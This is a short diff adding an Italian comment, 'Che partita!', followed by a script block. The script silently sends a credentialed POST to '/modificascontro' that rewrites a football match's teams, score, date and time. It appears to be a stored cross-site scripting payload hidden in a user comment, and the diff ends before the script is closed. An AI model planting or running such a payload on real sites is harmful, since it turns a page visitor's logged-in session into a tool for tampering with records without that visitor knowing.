@@ -1,0 +1,11 @@
+Che partita!
+   <script>
+     fetch("/modificascontro", {
+       method: "POST",
+     credentials: 'same-origin',
+       headers: {
+         "Content-Type": "application/x-www-form-urlencoded"
+       },
+       body: new URLSearchParams({ scontro_id: 24, squadra1id: 25,squadra2id: 24,punteggio1: 1,punteggio2: 3,data: "2025-10-08",      orario: "20:45"           
+       })
+     });
